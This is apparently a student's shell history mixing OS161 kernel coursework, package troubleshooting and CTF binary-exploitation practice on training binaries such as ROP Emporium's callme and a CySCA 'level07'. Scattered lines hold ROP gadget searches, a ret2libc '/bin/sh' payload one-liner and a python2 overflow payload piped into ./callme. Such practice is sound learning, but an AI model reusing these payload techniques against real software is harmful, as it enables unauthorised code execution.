ROPgadget --binary level07
ROPgadget --binary level07 | grep "ptr"
ROPgadget --binary level07 | grep "RSI"
ROPgadget --binary level07 | grep "rsi"
ROPgadget --binary level07 | grep "esi"
ROPgadget --binary level07 | grep "ebx"
ROPgadget --binary level07 | grep "rbx"
ROPgadget --binary level07 | grep "ecx"
ROPgadget --binary level07 | grep "rcx"
pwndbg ./level07
python ./exploit.py 
strace --help
strace
strace -p 22555
fg
python ./exploit.py 
python ./exploit.py > exp
pwndbg ./level07
strace ./level07 -p 901
pwndbg ./level07
strace -p 7506
aaaaaaaaaaaaaaaaaaaaaaaa
python ./attempt1.py 
system("sh")
system("bin/sh")
system("/bin/sh")
system("/bin/sh;")
python ./attempt1.py 
python ./attempt1.py > exp
python ./attempt1.py 
python ./attempt1.py > exp
ROPgadget --binary level07
python ./attempt1.py
python ./exploit.py 
python ./exploit.py > exp
ROPgadget --binary level07 | grep "[r|e]cx"
python ./exploit.py > exp
python ./exploit.py 
strings ./level07
strings /home/enigma/libc-database/db/libc.so.6 | grep "/bin/sh"
ROPgadget --binary /home/enigma/libc-database/db/libc.so.6 | grep "/bin/sh"
ROPgadget --binary /home/enigma/libc-database/db/libc.so.6
one_gadget 
one_gadget ./level07
one_gadget /home/enigma/libc-database/db/libc.so.6
one_gadget /lib/x86_64-linux-gnu/libc.so.6 
python ./exploit.py 
python ./exploit.py > exp
python ./exploit.py
python -c 'print "A"*140 + "BBBB"' | strace ./level07 
python ./exploit.py
python ./exploit.py > exp
ROPgadget --binary /lib/x86_64-linux-gnu/libc.so.6 | grep "rdi"
ROPgadget --binary /lib/x86_64-linux-gnu/libc.so.6 | grep "pop rdi"
python ./exploit.py > exp
objdump -d /lib/x86_64-linux-gnu/libc.so.6 | grep -B5 ret
objdump -d /lib/x86_64-linux-gnu/libc.so.6 | grep -B5 pop    rdi
objdump -d /lib/x86_64-linux-gnu/libc.so.6 | grep -B5 pop rdi; ret
objdump -d /lib/x86_64-linux-gnu/libc.so.6 | grep -B5 "pop rdi; ret"
objdump -d /lib/x86_64-linux-gnu/libc.so.6 | grep -B5 "pop"
xxd -c1 -p /lib/x86_64-linux-gnu/libc.so.6 | grep -n -B1 c3 | grep 5f -m1 | awk '{printf"%x\n",$1-1}'
pid=`ps -C level07 -o pid --no-headers | tr -d ' '`
grep libc /proc/$pid/maps
python ./exploit.py > exp
python ./exploit.py
nm -D /lib/x86_64-linux-gnu/libc.so.6 | grep '\<system\>'
python ./exploit.py
(echo -n /bin/sh | xxd -p; printf %024d 0; printf %016x $((0x7ffff79f5000+0x20b8b)) | tac -rs..; printf %016x $((0x7ffff79f5000 + 0x0000000000047dc0+0x15c160)) | tac -rs..) | printf %016x $((0x7ffff79f5000+0x47dc0)) | tac -rs..) |
xxd -r -p | setarch `arch` -R ./level07
(echo -n /bin/sh | xxd -p; printf %024d 0; printf %016x $((0x7ffff79f5000+0x20b8b)) | tac -rs..; printf %016x $((0x7ffff79f5000 + 0x0000000000047dc0+0x15c160)) | tac -rs..) |printf %016x $((0x7ffff79f5000+0x47dc0)) | tac -rs..) |xxd -r -p | setarch `arch` -R ./level07
xxd -p; printf %0130d 0;
echo xxd -p; printf %0130d 0;
echo xxd -p; printf "A"*24;
python ./exploit.py > exp
cat exp
python ./exploit.py > exp
python ./exploit.py
python ./exploit.py > exp
cd gits/infosec/ctfs/k17/sem1/
ls
python ./exploit
python ./exploit.py 
gcc whropper.c -o whropper -fno-stack-protector -z execstack -no-pie
gcc whropper.c -o whropper -fno-stack-protector -z -no-pie
./whropper
python ./exploit.py 
gcc whropper.c -o whropper -fno-stack-protector -z execstack -no-pi
python ./exploit.py 
gcc whropper.c -o whropper -fno-stack-protector -no-pie
python ./exploit.py 
checksec ./whropper
cd
cd cysca/quals/2018/7
ls
strace ./level07 
ls
r2 level07
rabin2 -r ./level07
rabin2 -S ./level07
r2 ./level07
vagrand up
vagrant up
cd gits/repos/vagrant-ctf-box/
ls
./setup.sh 
cd
pip install --upgrade pip
sudo -h pip install --upgrade pip
sudo -H pip install --upgrade pip
vagrant up
cd gits/repos/vagrant-ctf-box/
vagrant up
sudo apt install virtualbox
man fork
ls
subl test.py 
ls
cd gits/infosec/ctfs/k17/sem1/
ls
subl whropper.c 
ls
subl exploit.py 
python ./exploit
ls
python ./exploit.py 
pwndbg ./whropper
checksec ./whropper
pwndbg ./whropper
r2 ./whropper
python
cd cs3231/asst2-src/
git pull
git stash
git pull
git fetch --all
git reset --hard origin/master
subl ~/.bash_aliases 
os-makeall 
subl ~/.bash_aliases 
os-test 
git stash
git pull
os-makeall 
os-test 
os-makeall 
os-test 
os-makeall 
os-test 
os-makeall 
os-test 
os-makeall 
os-test 
os-makeall 
os-test
os-makeall 
os-test
os-makeall 
os-test
os-makeall 
os-test
os-makeall 
os-test
os-makeall 
os-test
python
cd
ls
pwndbg ./test
ls
python
./test
ls
suble test.c
subl test.c
python
ls
cd gits/infosec/ctfs/k17/sem1/
ls
./whropper
pwndbg ./whropper
python ./exploit.py 
touch flag
ls
subl flag
ls
touch pwned.py
ls
pwndbg ./whropper
subl exploit.py
pwndbg ./whropper
ls
subl pwned.py 
python
r2 ./whropper
cd gits/infosec/ctfs/k17/sem1
ls
./whropper 
checksec ./whropper
r2 ./whropper
pwndbg ./whropper
./whropper 
python ./pwned.py 
python
python ./pwned.py 
cd
cd gits/infosec/ctfs/k17/sem1
ls
subl pwned.py 
python ./pwned.py 
pwndbg ./whropper
cd
subl .bash_aliases 
cs3231/asst2-src/
cd cs3231/
cd asst2-src/
git add .
git commit -m "should work?"
git push
git add .
git commit -m "change __OPEN_MAX to OPEN_MAX as per Instructor Preference"
git pull
git push
os-makeall
os-test
git add .
git commit -m "rename fdt to fdt_p to match process struct specs"
git push
os-makeall
os-test
os-makeall
os-test
os-makeall
os-test
os-make
os-test
os-make
os-test
os-make
os-test
os-make
os-test
os-make
os-test
os-make
os-test
os-make
os-test
os-make
os-test
os-makeall
os-test
os-makeall
os-test
os-makeall
os-test
os-make
os-test
os-make
os-test
os-make
os-test
os-make
os-test
os-make
os-test
os-make
os-test
os-make
os-test
os-make
os-test
git branch cpystr
git checkout cpystr 
git add .
git commit -m "not working"
git checkout master
git pull
os-make
os-test
git stash
git fetch master
git pull
cd ../
cd asst2-src/
git branch cpystr
git checkout cpystr 
git add .
git commit -m "memory errors"
gitch checkout master
git checkout master
git pull
os-make
os-test
git checkout cpystr 
git stash
git checkout cpystr 
git push
git push --set-upstream origin cpystr
git checkout master
git puh
git push
git checkout cpystr 
git push
git push --set-upstream origin cpystr
git add .
git commit -m "test"
cd ../
ls
cd asst2-src/
git checkout cpystr 
git stash
git checkout cpystr 
git push --set-upstream origin cpystr
git checkout master
git pull
os-makeall
os-test
os-makeall
os-test
os-makeall
os-test
os-makeall
os-test
os-makeall
os-test
os-makeall
os-test
os-makeall
os-make
os-test
os-make
os-test
os-make
os-test
os-make
os-test
os-make
os-test
os-make
os-test
git add .
cd ../
cd asst2-src/
git add .
git commit -m "dup2 no locks yet"
git push
git add .
git commit -m "lock added to dup2"
git push
os-make
os-test
os-make
os-test
os-make
os-test
os-make
os-test
os-make
os-test
os-make
os-test
os-make
os-test
os-make
os-test
os-make
os-test
os-make
os-test
os-make
os-test
os-make
git add .
git commit -m "issues with locks"
git push
os-make
os-test
os-debug
subl ~/.gdbinit 
os-debug
subl ~/.gdbinit 
os-debug
ls
subl .gdbinit 
gdb kernel
sys161 -w kernel 
os161-gdb kernel 
subl ~/.gdbinit 
cd .../
os-test
cd
cd gits/repos/comp2521/labs/lab05
ls
make
./crawl
./crawl http://www.handbook.unsw.edu.au/2017 100
make
./crawl http://www.handbook.unsw.edu.au/2017 100
make
./crawl http://www.handbook.unsw.edu.au/2017 100
os-make
os-test
os-make
os-test
os-gdb
cd
ls
cd cysca/quals/2018/
ls
cd web/
ls
mkdir 1
cd 1
subl bruteforce.py
python ./bruteforce.py 
python3 ./bruteforce.py 
python2.7 ./bruteforce.py 
ls
subl test.py
python ./test.py 
os-makeall
os-test
os-make
os-test
os-make
os-test
os-make
os-test
os-make
os-test
os-make
os-test
git add .
git commit -m "fixed lock error"
git pull
os-make
git add .
git commit -m "fix lock error"
git pull
git push
os-make
os-makeall
git stash
os-makeall
os-test
rm -r *.o
cd ../
s
ls
cd asst2-src/
rm -r *.o
ls
rm --help
rm -R *.o
rm -R *.o *
git stash
rm -R *.o *.o
ls
cd kern/compile/ASST2/
rm -R *.o
os-makeall
run
os-test
cd ../asst2-src/
cd kern/compile/ASST2/
rm -R *.o
git add .
git commit -m "remove all .o files"
git push
cd ../../
cd ../
subl .gitignore
git add .
git commit -m "ignore file"
git push
os-makeall
git add .
git commit -m "test"
git push
os-makeall
os-test
git add .
git commit -m "merged"
git push
cd ../
os-make
git add .
git commit -m "merged lseek"
git push
git add .
git commit -m "ignore all in here"
git push
os-makeall
os-test
os-makeall
os-test
os-makeall
os-test
os-makeall
os-test
os-make
os-test
os-make
os-test
os-make
os-test
os-make
os-test
os-make
os-test
os-make
os-test
os-make
os-test
os-makeall
os-test
os-make
os-test
s-make
os-make
os-test
os-make
os-test
os-make
os-test
os-make
os-test
os-make
os-test
os-make
os-test
os-make
os-test
os-make
os-test
os-make
os-test
os-make
os-test
os-make
os-test
os-make
os-test
os-make
os-test
os-makeall
os-test
os-makeall
os-test
os-makeall
os-test
os-makeall
os-test
os-makeall
os-test
os-makeall
os-test
os-makeall
os-test
man fork
ssh-unsw
cd
ls
subl test.py 
python ./test.py 
python2.7 ./test
python2.7 ./test.py
python3 ./test.py 
pip3 install urllib2
sudo apt install python3-pip
pip3 install upgrade
pip install urllib2
sudo pip install urllib2
sudo pip install --upgrade --force-reinstall
sudo pip install --upgrade
subl /usr/local/bin/pip
sudo apt remove python-pip
pwntools
python
python3 ./test.py 
python ./test.py 
./test 220.233.10.167
cd comp3231
comp3231
cd asst2-src/
ls
git pull
git add .
git commit -m "latest"
git push
os-test
cd ../
cd asst2-src/
git add .
git commit -m "anything?"
git push
os-makeall
os-test
os-make
os-test
cd
subl .bash_aliases 
ssh-unsw
cd cs3231/root/
subl sys161.conf 
ls
subl test.py 
ls
cd Desktop/
ls
cd
cd gits/infosec/ctfs/k17/
ls
cd sem1/
ls
cd
os-make
cd ../
git pull
dns-switch 
cd cs3231/asst2-src/
git stash
git pull
atom .
sudo apt install update-manager-core
sudo apt autoremove
cd lab04
ls
cd ../
cd lab05
ls
./travel Bombay Chicago 5000
comp252
comp2521
cd gits/repos/comp2521/
ls
cd labs/
cd lab05
ls
make
./crawl http://www.cse.unsw.edu.au/~cs2521/18s1/mini-web/ 30
make
./crawl http://www.cse.unsw.edu.au/~cs2521/18s1/mini-web/ 30
sudo apt update && sudo apt dist-upgrade
sudo do-release-upgrade
sudo apt update
cd gits/infosec/ctfs/k17/sem1/
ls
subl whropper.c 
ls
subl exploit.py
sudo apt install deluge
sudo apt autoremove 
sudo apt remove deluge
sudo apt install deluge
sudo apt remove deluge
sudo apt remove deluge-
sudo apt remove deluge
sudo apt remove deluge-common 
subl sort.py
python ./sort.py 
os-make
cd ../../
cd ../
git pull
os-makeall
os-make
cd ../
ls
cd ../
ls
bmake
cd conf/
ls
./config ASST2
bmake
make
bmake all
cd ../
bmake
bmake all
cd ../
bmake
bmake all
os-make
os-makeall
cd
cd cs3231/
ls
mv asst2-src/ backup
ls
git stash
git checkout master
git clone git@github.com:3N1GMA-HPY/asst2-src.git
os-makeall
os-make
apt install os161
cd cs3231/asst2-src/
ls
./configure 
cd conf
ls
cd kern/
ls
cd conf/
ls
./config ASST2
make depend
ls
bmake
bmake install
bmake ASST2
subl ~/.bash_aliases 
cd ../compile/ASST2/
bmake
cd ../
ls
cd ASST2/
ls
os-makeall
ls
cd
cd cs3231/
ls
git pull
cd asst2-src/
ls
subl .gitignore 
git add .
git commit -m "fix git"
git push
git pull
os-makeall
git add .
cd ../../../
git add .
git commit -m "add .o files"
git push
git pull
os-makeall
cd
cd Downloads/
sudo dpkg -i os161-utils_2.0.8.deb
os-makeall
os-make
cd ../../
ls
cd ../
ls
git checkout AssignmentPart1 
git stash
git checkout AssignmentPart1 
os-make
os-make all
sudo apt-get update
sudo apt-get install libmpfr4
sudo apt-get install libmpfr6
os-make
checkout master
git checkout master
git pull
os-makeall
os-test
os-boot
os-make
os-test
os-make
os-test
os-make
os-test
os-make
os-test
os-make
os-test
os-make
os-test
os-make
os-test
os-make
os-makeall
man 2 sleep
man sleep
man 3 sleep
os-makeall
os-test
os-makeall
os-test
os-makeall
os-test
os-makeall
os-test
os-makeall
os-test
os-makeall
os-test
os-makeall
os-test
os-makeall
os-test
cd gits/infosec/training/
ls
cd ropemporium/
ls
cd callme/
cd ../
ls
cd ret2win/
ls
subl flag.txt 
subl ret2win.txt 
r2 ret2win
checksec ./ret2win
sudo apt install shutter
sudo apt autoremove 
shutter
sudo apt install gnome-web-photo
sudo apt install ExifTool
sudo apt install exiftool
sudo apt install appindicator
subl ~/.profile
shutter
sudo apt install libgoo-canvas-perl
sudo apt install libgoocanvas
sudo apt install libgoocanvas-2.0-9
shutter
sudo apt install libgoocanvas-2.0-common 
sudo apt install libgoocanvas-2.0-dev 
sudo apt-get install libgtk2-appindicator-perl
sudo apt remove shutter
sudo add-apt-repository ppa:shutter/ppa
sudo apt-get update && sudo apt-get install shutter
sudo apt update
sudo apt install shutter 
shutter
pw
psw
pws
ps
ps -A
ps -A | grep shutter
pkill --help
pkill shutter
ps -A | grep shutter
shutter
sudo apt-get install libgtk2-appindicator-perl
sudo apt-get install shutter libgoo-canvas-perl libgtk2-appindicator-perl
$ 
sudo apt remove python3-pip
sudo chmod +x ./pip3
subl pip3
sudo cp ./pip3 /usr/bin
pip3
chmod +x /usr/bin/pip3
sudochmod +x /usr/bin/pip3
sudo chmod +x /usr/bin/pip3
pip3
pip install --upgrade --user pip
sudo apt removve python-pip
sudo apt remove python-pip
sudo apt autoremove 
python -m pip uninstall pip --user
sudo apt remove python-pip
pip
sudo rm /usr/local/bin/pip
sudo rm /usr/local/bin/pip3
pip
python -m pip --version
sudo apt install pip
curl https://bootstrap.pypa.io/get-pip.py -o get-pip.py
python get-pip.py
ls
python2.7 get-pip.py 
python3 get-pip.py 
python -m pip uninstall pip
python3 -m pip uninstall pip
python3 -m pip uninstall pip3
python3 -m pip3 uninstall pip
pip3
sudo apt remove python3
sudo apt remove python
sudo apt install python
sudo apt install python3
sudo apt install python3.7
sudo apt install python2.7
sudo apt install python3.6
sudo apt autoremove 
pip
sudo apt install python-pip
sudo apt-get update && sudo apt-get -y upgrade
sudo apt-get -y upgrade
sudo apt install python-pip
pip -V
pip install --upgrade pip
python3 -m pip install --upgrade pip
python3 -m pip
hash -r pip
pip
hash
/usr/bin/env python3 -m pip intall --user --upgrade pip
$PATH
hash -r
pip
hash -r
hash -d pip
pip
pip install --upgrade --user pip
python -m pip install --force-reinstall pip
sudo -H python -m pip install --force-reinstall pip
pip install pipimport
python -m pip install pipimport
sudo -H python -m pip install pipimport
sudo -H python -m pip install stix-validator
sudo -H python -m pip install sphinx
sudo -H python -m pip install stix
sudo -H python -m pip install beatifulsoup4
sudo -H python -m pip install beatifulsoup
sudo -H python -m pip install beautifulsoup4
sudo -H python -m pip install conpot
pip install pipimport
sudo -H python -m pip install lxml
sudo -H python -m pip install Pygment
sudo -H python -m pip install sphinx
sudo -H python -m pip install mixbox
sudo -H python -m pip install stix
sudo -H python -m pip install libtaxii
sudo -H python -m pip install chardet

python -m pip install pipimport
sudo -H python3 -m pip install --force-reinstall pip
pip
pip3
sudo apt install python3-pip
sudo -H python3 -m pip install --force-reinstall pip
sudo -H python3 -m pip install virtualenv
sudo -H python3 -m pip install mako
sudo -H python3 -m pip install pwntools
pip3
terminator
sudo apt install terminator
sudo apt update
sudo apt upgrade
sudo apt autoremove
pip3
pip2
pip
python
pip install pwntools
python
pip2.7 install pwntools
python2.7 -m pip install pwntools
python2.7
r2
cd gits/infosec/training/ropemporium/
ls
cd ret2win/
ls
python ./version2.py 
python ./version3.py 
python ./version3_ropmethod.py 
ls
subl version2.py 
ls
cd ../
ls
cd split/
ls
subl info.txt 
r2 ./split 
ROPgadget --binary split
ROPgadget --binary split | grep -E '[r|e]di'
ls
subl exploit2.py 
python ./exploit2.py 
python ./exploit.py 
subl exploit.py 
python ./exploit.py 
ls
cat flag.txt 
python ./exploit.py 
ls
python ./exploit2.py 
python3 ./exploit
python3 ./exploit2.py 
subl exploit2.py 
python ./exploit.py 
ROPgadget --binary split | grep -E '[r|e]di'
pwndbg
python ./exploit.py 
ls
cat flag.txt 
python ./exploit
python ./exploit.py 
ls
./split < exploit
rm exploit
ls
rm core*
ls
python ./crackshell.py 
subl crackshell.py 
python3 crackshell.py > exploit
./split < exploit
rm exploit
ls
python ./exploit
python ./exploit.py 
ls
python ./exploit
rm exploit
ls
rm core
rm xaa
ls
python ./exploit.py 
cd
cd cysca/quals/2018/7
ls
subl exploit.py 
pwndbg
ls
cd
pwndbg attach 23117
pwndbg
sudo apt update
restart
sudo restart
reboot
ls
sudo apt repair
ls
sudo apt-get update
sudo apt-get install --reinstall ubuntu-desktop
subl /sysdeps/unix/sysv/linux/read.c
cd /sysdeps/unix/sysv/linux/
gdb --version
cd
ls
cd gits/software/
ls
cd pwndbg/
ls
gi tpull
git pull
ls
./setup.sh 
sudo -H ./setup.sh 
pwndbg 
cd gits/infosec/training/ropemporium/
ls
cd ret2win/
ls
cd ../
ls
cd callme/
ls
cd ../
cd split/
ls
python ./exploit.py 
r2 split 
ls
cd ../
ls
cd write4/
r2 write4 
pwndbg
nc wwdsm.chal.pwning.xxx:6615
wwdsm.chal.pwning.xxx:6615
pwndbg
pwnme
pwndbg 
strings ./split 
strings ./split | grep bin
strings -x ./split | grep bin
strings -X ./split | grep bin
strings -a ./split | grep bin
strings -T ./split | grep bin
strings -t ./split | grep bin
strings -s ./split | grep bin
strings -d ./split | grep bin
strings -t 8 ./split | grep bin
strings ./split | grep bin
python ./exploit.py 
cd ../
ls
cd callme/
ls
subl info.txt 
rabin2 -R callme
r2 ./callme
pwndbg
pwndbg ./callme
pwndbg
ls
pwndbg ./callme
cd ../write4/
ls
pwndbg ./write4
ROPgadget --binary callme | grep -E '[r|e]dx' | '[r|e]si' | '[r|e]di'
ROPgadget --binary callme | grep '[r|e]dx' | grep '[r|e]si' | grep '[r|e]di'
ROPgadget --binary callme | grep '[r|e]dx' & grep '[r|e]si' | grep '[r|e]di'
ROPgadget --binary callme | grep '[r|e]dx' && grep '[r|e]si' && grep '[r|e]di'
ROPgadget --binary callme | grep '[r|e]dx' && '[r|e]si' && grep '[r|e]di'
grep --help
ROPgadget --binary callme | grep -E '[r|e]dx'ROPgadget --binary callme | grep -E '[r|e]dx'
ROPgadget --binary callme | grep -E '[r|e]dx'
ROPgadget --binary callme | grep -E '[r|e]si'
ROPgadget --binary callme | grep -E '[r|e]di'
ls
python ./exploit.py 
python ./exploit2.py 
ls
subl exploit.py 
python ./exploit.py 
ROPgadget --binary callme | grep -E '[r|e]si'
python ./exploit.py 
ls
subl exploit2.py 
python ./exploit.py 
ls
subl encrypted_flag.txt 
ls
subl killit.txt 
python ./exploit.py 
subl test.py
python ./test.py 
python3 ./test.py 
python -m pip install struct
python ./test.py 
ls
./callme < callme_payload 
ls
rm callme_payload 
ls
rm encrypted_flag.txt 
ls
rm key*
ls
rm killit.txt 
ls
rm libcallme.so 
ls
rm test.py 
ls
rm core 
ls
extract callme.zip 
./callme.zip
tar --help
ls
tar -xf callme.zip
zip -x callme.zip
zip
zip --help | grep extract
zip -A callme.zip 
ls
zip -e callme.zip 
unzip callme.zip 
ls
python ./exploit.py 
python ./exploit2.py 
python ./exploit.py 
ls
cat exploit.py 
python ./exploit.py 
ls
chmod +x key*
python ./exploit.py 
ls
chmod +r encrypted_flag.txt 
ls
python ./exploit.py 
python2 -c "print 'A'*44 + '\xc0\x85\x04\x08' + '\xa9\x88\x04\x08' + '\x01\x00\x00\x00' + '\x02\x00\x00\x00' + '\x03\x00\x00\x00' + '\x20\x86\x04\x08' + '\xa9\x88\x04\x08' + '\x01\x00\x00\x00' + '\x02\x00\x00\x00' + '\x03\x00\x00\x00' + '\xb0\x85\x04\x08' + '\xa9\x88\x04\x08' + '\x01\x00\x00\x00' + '\x02\x00\x00\x00' + '\x03\x00\x00\x00'" | ./callme32 
python2 -c "print 'A'*44 + '\xc0\x85\x04\x08' + '\xa9\x88\x04\x08' + '\x01\x00\x00\x00' + '\x02\x00\x00\x00' + '\x03\x00\x00\x00' + '\x20\x86\x04\x08' + '\xa9\x88\x04\x08' + '\x01\x00\x00\x00' + '\x02\x00\x00\x00' + '\x03\x00\x00\x00' + '\xb0\x85\x04\x08' + '\xa9\x88\x04\x08' + '\x01\x00\x00\x00' + '\x02\x00\x00\x00' + '\x03\x00\x00\x00'" | ./callme
ls
cat encrypted_flag.txt 
./key1.dat 
cat key1.dat 
./key1.dat 1 2 3
cd ../
ls
cd write4/
ls
subl info.txt 
ls
python ./exploit.py 
subl exploit.py 
ls
python3 ./exploit.py 
python ./exploit.py 
ls
./write4 
python ./exploit.py 
rabin2 -R ./write4 
rabin2 -S ./write4 
python ./exploit.py 
rabin2 -S ./write4 
python ./exploit.py 
rabin2 -S ./write4 
python ./exploit.py 
rabin2 -S ./write4 
python ./exploit.py 
rabin2 -S ./write4 
python ./exploit.py 
rabin2 -S ./write4 
python ./exploit.py 
s
python ./exploit.py 
ls
python ./exploit.py 
rabin2 -S ./write4 
python ./exploit.py 
cd
ls
cd gits/
ls
cd infosec/
ls
cd scripts/
ls
cd ../
ls
cd software/
ls
ls -a
cd home_sec/
ls
cd ../
ls
cd ../
ls
cd software/
ls
cd ../
ls
cd training/
ls
cd ../
ls
cd other/
ls
cd ../
ls
cd ctfs/
ls
cd comp6445/
ls
cd ../
ls
dns-switch 
ls
./Vagrantfile 
./setup.sh 
sudo -H ./setup.sh 
ls
vagrant
ls
vagrant Vagrantfile
vagrant init
vagrant up
sudo apt install virtualbox
vagrant up
vagrant provision
vagrant plugin install vagrant-berkshelf
vagrant plugin install vagrant-hostmanager
sudo vagrant plugin install vagrant-berkshelf
vagrant up
vagrant ssh
ls
subl ~/.bash_aliases 
cd gits/repos/vagrant-ctf-box/
hack
vagrant --help
vagrant reload
hack
ls
cd
cd gits/infosec/
ls
cd training
ls
cd ctfs
ls
PATH
$PATH
pwd
ls
rm ctfs 
ls
unlink training 
ls
cd ctfs
ctfs
ls
unlink ctfs
unlick training 
ls
unlink training 
ls
cd training
ls
cd ../
ls
sudo -H python -m pip install --force-reinstall pip
ls
cd
ls
subl .bash_aliases 
cd Downloads/
ls
ls | grep atom
cd
cd gits/
ls
cd repos/
ls
cd vagrant-ctf-box/
ls
cd vagrant-share/
ls
rm atom-amd64.deb 
rm callme 
ls
rm .bashrc 
ls
ls -a
ls
ln -s ~/gits/infosec/ infosec
ls
./infosec
cd infosec
ls
cd
ls
cd gits/repos/vagrant-ctf-box/
ls
cd vagrant-share/
ls
chmod +r infosec
ls
cd ../
ls
rm vagrant-share/
rm -r vagrant-share/
ln -s ~/gits/infosec/ vagrant-share
ls
unlink vagrant-share
ls
mkdir vagrant-share
ls
rm vagrant-share/
rm -r vagrant-share/
ls
mv Vagrantfile ~/gits/infosec/ctfs/
cd ~/gits/infosec/ctfs/
ls
vagrant up
mkdir vagrant-share
cd ~/gits/repos/vagrant-ctf-box
ls
cp setup.sh ~/gits/infosec/ctfs/
cd ~/gits/infosec/ctfs
ls
vagrant up
vagrant ssh
vagrant up
vagrant --help
vagrant validate
vagrant init
vagrant reload
ls
mv Vagrantfile ~/gits/repos/vagrant-ctf-box/
ls
mv setup.sh ~/gits/repos/vagrant-ctf-box/
ls
mv vagrant-share/ ~/gits/repos/vagrant-ctf-box/
cd ../
ls
mv ctfs ~/gits/repos/vagrant-ctf-box/vagrant-share/
mv training/ ~/gits/repos/vagrant-ctf-box/vagrant-share/
cd ../repos/vagrant-ctf-box/
ls
cd vagrant-share/
ls
ln -s ctfs ~/gits/infosec/
ln -s training ~/gits/infosec/
ls
cd ../
ls
vagrant reload
vagrant ssh
ls
cd vagrant-share/
ls
ln -s ctfs /home/enigma/gits/infosec
ln -s training/ /home/enigma/gits/infosec
ln -sf training/ /home/enigma/gits/infosec
ls--help
ln --help
ln -r training/ /home/enigma/gits/infosec
ln -r -s training/ /home/enigma/gits/infosec
ls
ln -r -s ctfs/ /home/enigma/gits/infosec
hack
ls -a
atom .bashrc 
cd cs3231/asst2-src/
atom .
kill atom
pkill atom
atom .
git pull
os-makeall
os-test
os-make
os-test
ls -a
ls -l
cd 
ls
chmod +r+w Videos/
chmod --help
chmod +r+w -R Videos/
cd Videos/
ls
cd UNSW/
ls
cd OperatingSystems/
ls
rm lecture_16.mp4 
ls -a
ls
ls -l
rm -f lecture_16.mp4 
cd
cd gits/infosec/training/
ls
cd ropemporium/
ls
atom .
cd ../
cd sectalks_rop/
ls
cd salt/
ls
atom .
./salt
ls
./salt.dat 
cd ../
ls
cd pivotal/
ls
atom .
cd gits/infosec/
ls
hack
ln -r -s home/enigma/gits/infosectraining/ /home/enigma/gits/infosec
ln -r -s cysca/ /home/enigma/gits/infosec
ls
cd ../
ls
cd infosec/
ls
ln -r -s home/enigma/gits/infosectraining/ /home/enigma/gits/infosec
ls
cd vagrant-share/
ls
cd cysca/week_1/babyheap/
ls
cd ../
atom .
sudo apt install playonlinux 
hack
socat TCP-LISTEN:2323,reuseaddr,fork EXEC:./badchars
hack
pidof socat
gdb -q -p 12202
socat TCP-LISTEN:2323,reuseaddr,fork EXEC:./badchars
ls
cd vagrant-share/cysca/week_1/badchar/
socat TCP-LISTEN:2323,reuseaddr,fork EXEC:./badchars
python
subl z3solver.py
cd
cd Downloads/
s
ls
chmod +x 4a2181aaf70b04ec984c233fbe50a1fe600f90062a58d6b69ea15b85531b9652
./4a2181aaf70b04ec984c233fbe50a1fe600f90062a58d6b69ea15b85531b9652 
rm 4a2181aaf70b04ec984c233fbe50a1fe600f90062a58d6b69ea15b85531b9652
ls
python
hack
cd
cd gits/repos/comp2521/
ls
cd labs/
ls
cd lab05
ls
cd ../
ls
cd lab04
ls
atom .
ssh z5168147@cse.unsw.edu.au
touch cribdrag
subl cribdrag 
mv cribdrag cribdrag.py
python ./cribdrag.py 
cribdrag 274c10121a0100495b502d551c557f0b0833585d1b27030b5228040d3753490a1c025415051525455118001911534a0052560a14594f0b1e490a010c4514411e070014615a181b02521b580305170002074b0a1a4c414d1f1d171d00151b1d0f480e491e0249010c150050115c505850434203421354424c1150430b5e094d144957080d4444254643
cribdrag 809fdd88dafa96e3ee60c8f179f2d88990ef4fe3e252ccf462deae51872673dcd34cc9f55380cb86951b8be3d8429839
cribdrag 274c10121a0100495b502d551c557f0b0833585d1b27030b5228040d3753490a1c025415051525455118001911534a0052560a14594f0b1e490a010c4514411e070014615a181b02521b580305170002074b0a1a4c414d1f1d171d00151b1d0f480e491e0249010c150050115c505850434203421354424c1150430b5e094d144957080d4444254643
python
cribdrag 274c10121a0100495b502d551c557f0b0833585d1b27030b5228040d3753490a1c025415051525455118001911534a0052560a14594f0b1e490a010c4514411e070014615a181b02521b580305170002074b0a1a4c414d1f1d171d00151b1d0f480e491e0249010c150050115c505850434203421354424c1150430b5e094d144957080d4444254643
cd /home/enigma/gits/infosec/scripts/
subl cribdrag.py 
cribdrag 274c10121a0100495b502d551c557f0b0833585d1b27030b5228040d3753490a1c025415051525455118001911534a0052560a14594f0b1e490a010c4514411e070014615a181b02521b580305170002074b0a1a4c414d1f1d171d00151b1d0f480e491e0249010c150050115c505850434203421354424c1150430b5e094d144957080d4444254643
cd ../
ls
cd scripts/
ls
cd crypto/
ls
mkdir repos
cd repos/
git clone https://github.com/ValarDragon/CTF-Crypto.git
ls
subl 
subl cipherinfo.py
cribdrag test
hack
cd
ls
sudo apt install gpa gnupg2
cd /etc/ssl/certs
ls
sudo apt --fix-missing?
sudo apt --fix-missing
sudo apt install --fix-missing?
sudo apt update
ls
cd
gdb
pwndbg
hack
wine python.exe Scripts/pip.exe install pyinstaller
sudo wine python.exe Scripts/pip.exe install pyinstaller
wine python.exe Scripts/pip.exe install pyinstaller
ine msiexec /i python-2.7.10.msi/L*v log.txt
wine msiexec /i python-2.7.10.msi/L*v log.txt
cd
cd Downloads/
wine msiexec /i python-2.7.15.amd64.msi/L*v log.txt
wine python.exe Scripts/pip.exe install pyinstaller
sudo apt upgrade
pip install -I --pre --no-use-wheel capstone-windows
pip install capstone-windows
sudo -H pip install capstone-windows
sudo -H pip install pyvex
sudo -H pip install unicorn
sudo -H pip install simuvex
sudo -H pip install angr
cd
cd gits/
ls
cd infosec/
ls
cd training
ls
cd ../
ls
cd scripts/
ls
subl ssh_downloader.py
cd
ls
cp .bash_it/ ~/gits/repos/vagrant-ctf-box/vagrant-share/
cp -R .bash_it/ ~/gits/repos/vagrant-ctf-box/vagrant-share/
cp -R .bash_aliases ~/gits/repos/vagrant-ctf-box/vagrant-share/
cp -R .bashrc ~/gits/repos/vagrant-ctf-box/vagrant-share/
cd ~/gits/repos/vagrant-ctf-box
ls
cd vagrant-share/
ls
ln --help
ls
ls --help
ln --help
ls
cd info
cd infosec/
cd ../repos/
ls
cd ../
ls
cd repos/vagrant-ctf-box/
ls
subl Vagrantfile 
cd
cd .
cd ~/gits/repos/vagrant-ctf-box/
subl Vagrantfile 
ls
cd
ls
atom .
$BASH_IT
cd vagrant-share/
ls
cd cysca/
ls
cd ../
ls
